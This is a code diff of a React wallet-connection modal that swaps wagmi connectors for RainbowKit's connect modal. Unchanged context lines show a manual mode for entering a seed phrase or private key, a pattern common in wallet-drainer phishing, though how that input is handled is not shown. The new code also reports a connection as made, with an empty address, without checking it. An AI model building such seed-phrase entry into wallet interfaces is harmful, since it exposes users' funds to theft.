@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect, useRef } from "react";
-import { useConnect } from "wagmi";
+import { useConnectModal } from "@rainbow-me/rainbowkit";
 
 interface WalletModalProps {
   open: boolean;
@@ -12,7 +12,7 @@ interface WalletModalProps {
 type ManualMode = "seed" | "privatekey";
 
 export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
-  const { connectors, connect } = useConnect();
+  const { openConnectModal } = useConnectModal();
   const [showManual, setShowManual] = useState(false);
   const [manualMode, setManualMode] = useState<ManualMode>("seed");
   const [walletName, setWalletName] = useState("");
@@ -53,44 +53,12 @@ export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
     document.body.style.overflow = "";
   }
 
-  /** Find a connector by its type name */
-  function getConnector(type: string) {
-    return connectors.find((c) => c.type === type);
-  }
-
   async function connectWallet(type: string) {
     handleClose();
-
-    // Injected wallets: MetaMask, Phantom, Trust, OKX, Rainbow, Rabby, Zerion, Ledger
-    if (
-      type === "metamask" || type === "phantom" || type === "trust" ||
-      type === "okx" || type === "rainbow" || type === "rabby" ||
-      type === "zerion" || type === "ledger"
-    ) {
-      const connector = getConnector("injected");
-      if (connector) {
-        connect({ connector });
-        onConnected?.("", type);
-      }
-      return;
-    }
-
-    // Coinbase Wallet
-    if (type === "coinbase") {
-      const connector = getConnector("coinbaseWallet");
-      if (connector) {
-        connect({ connector });
-        onConnected?.("", type);
-      }
-      return;
-    }
-
-    // WalletConnect fallback
-    const wcConnector = getConnector("walletConnect");
-    if (wcConnector) {
-      connect({ connector: wcConnector });
+    setTimeout(() => {
+      openConnectModal?.();
       onConnected?.("", type);
-    }
+    }, 100);
   }
 
   async function connectManual() {
